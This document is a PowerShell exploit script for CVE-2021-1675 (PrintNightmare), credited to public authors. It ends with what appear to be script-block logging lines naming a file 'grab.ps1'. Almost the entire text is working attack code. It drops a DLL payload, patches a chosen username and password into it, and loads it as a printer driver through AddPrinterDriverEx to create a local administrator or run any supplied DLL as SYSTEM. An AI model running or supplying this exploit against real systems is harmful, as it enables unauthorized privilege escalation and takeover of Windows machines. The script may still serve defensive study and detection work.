function Invoke-Nightmare
{
    <#
        .SYNOPSIS
        Exploits CVE-2021-1675 (PrintNightmare)

        Authors:
            Caleb Stewart - https://github.com/calebstewart
            John Hammond - https://github.com/JohnHammond
        URL: https://github.com/calebstewart/CVE-2021-1675

        .DESCRIPTION
        Exploits CVE-2021-1675 (PrintNightmare) locally to add a new local administrator
        user with a known password. Optionally, this can be used to execute your own
        custom DLL to execute any other code as NT AUTHORITY\SYSTEM.

        .PARAMETER DriverName
        The name of the new printer driver to add (default: "Totally Not Malicious")

        .PARAMETER NewUser
        The name of the new user to create when using the default DLL (default: "adm1n")

        .PARAMETER NewPassword
        The password for the new user when using the default DLL (default: "P@ssw0rd")

        .PARAMETER DLL
        The DLL to execute when loading the printer driver (default: a builtin payload which
        creates the specified user, and adds the new user to the local administrators group).

        .EXAMPLE
        > Invoke-Nightmare
        Adds a new local user named `adm1n` which is a member of the local admins group

        .EXAMPLE
        > Invoke-Nightmare -NewUser "caleb" -NewPassword "password" -DriverName "driver"
        Adds a new local user named `caleb` using a printer driver named `driver`

        .EXAMPLE
        > Invoke-Nightmare -DLL C:\path\to\

    #>
    param (
        [string]$DriverName = "Totally Not Malicious",
        [string]$NewUser = "",
        [string]$NewPassword = "",
        [string]$DLL = ""
    )

    if ( $DLL -eq "" ){
        $nightmare_data = [byte[]](get_nightmare_dll)
        $encoder = New-Object System.Text.UnicodeEncoding

        if ( $NewUser -ne "" ) {
            $NewUserBytes = $encoder.GetBytes($NewUser)
            [System.Buffer]::BlockCopy($NewUserBytes, 0, $nightmare_data, 0x32e20, $NewUserBytes.Length)
            $nightmare_data[0x32e20+$NewUserBytes.Length] = 0
            $nightmare_data[0x32e20+$NewUserBytes.Length+1] = 0
        } else {
            Write-Host "[+] using default new user: adm1n"
        }

        if ( $NewPassword -ne "" ) {
            $NewPasswordBytes = $encoder.GetBytes($NewPassword)
            [System.Buffer]::BlockCopy($NewPasswordBytes, 0, $nightmare_data, 0x32c20, $NewPasswordBytes.Length)
            $nightmare_data[0x32c20+$NewPasswordBytes.Length] = 0
            $nightmare_data[0x32c20+$NewPasswordBytes.Length+1] = 0
        } else {
            Write-Host "[+] using default new password: P@ssw0rd"
        }

        $DLL = [System.IO.Path]::GetTempPath() + "nightmare.dll"
        [System.IO.File]::WriteAllBytes($DLL, $nightmare_data)
        Write-Host "[+] created payload at $DLL"
        $delete_me = $true
    } else {
        Write-Host "[+] using user-supplied payload at $DLL"
        Write-Host "[!] ignoring NewUser and NewPassword arguments"
        $delete_me = $false
    }

    $Mod = New-InMemoryModule -ModuleName "A$(Get-Random)"

    $FunctionDefinitions = @(
      (func winspool.drv AddPrinterDriverEx ([bool]) @([string], [Uint32], [IntPtr], [Uint32]) -Charset Auto -SetLastError),
      (func winspool.drv EnumPrinterDrivers([bool]) @( [string], [string], [Uint32], [IntPtr], [UInt32], [Uint32].MakeByRefType(), [Uint32].MakeByRefType()) -Charset Auto -SetLastError)
    )

    $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Mod'

    # Define custom structures for types created
    $DRIVER_INFO_2 = struct $Mod DRIVER_INFO_2 @{
        cVersion = field 0 Uint64;
        pName = field 1 string -MarshalAs @("LPTStr");
        pEnvironment = field 2 string -MarshalAs @("LPTStr");
        pDriverPath = field 3 string -MarshalAs @("LPTStr");
        pDataFile = field 4 string -MarshalAs @("LPTStr");
        pConfigFile = field 5 string -MarshalAs @("LPTStr");
    }

    $winspool = $Types['winspool.drv']
    $APD_COPY_ALL_FILES = 0x00000004

    [Uint32]($cbNeeded) = 0
    [Uint32]($cReturned) = 0

    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, [IntPtr]::Zero, 0, [ref]$cbNeeded, [ref]$cReturned) ){
        Write-Host "[!] EnumPrinterDrivers should fail!"
        return
    }

    [IntPtr]$pAddr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([Uint32]($cbNeeded))

    if ( $winspool::EnumPrinterDrivers($null, "Windows x64", 2, $pAddr, $cbNeeded, [ref]$cbNeeded, [ref]$cReturned) ){
        $driver = [System.Runtime.InteropServices.Marshal]::PtrToStructure($pAddr, [System.Type]$DRIVER_INFO_2)
    } else {
        Write-Host "[!] failed to get current driver list"
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)
        return
    }

    Write-Host "[+] using pDriverPath = `"$($driver.pDriverPath)`""
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($pAddr)

    $driver_info = New-Object $DRIVER_INFO_2
    $driver_info.cVersion = 3
    $driver_info.pConfigFile = $DLL
    $driver_info.pDataFile = $DLL
    $driver_info.pDriverPath = $driver.pDriverPath
    $driver_info.pEnvironment = "Windows x64"
    $driver_info.pName = $DriverName

    $pDriverInfo = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf($driver_info))
    [System.Runtime.InteropServices.Marshal]::StructureToPtr($driver_info, $pDriverInfo, $false)

    if ( $winspool::AddPrinterDriverEx($null, 2, $pDriverInfo, $APD_COPY_ALL_FILES -bor 0x10 -bor 0x8000) ) {
        if ( $delete_me ) {
            Write-Host "[+] added user $NewUser as local administrator"
        } else {
            Write-Host "[+] driver appears to have been loaded!"
        }
    } else {
        Write-Error "[!] AddPrinterDriverEx failed"
    }

    if ( $delete_me ) {
        Write-Host "[+] deleting payload from $DLL"
        Remove-Item -Force $DLL
    }
}

ScriptBlock ID: c04b937e-47da-461b-8e89-a2265affa961
Path: C:\Users\elfmcnealy\Desktop\grab.ps1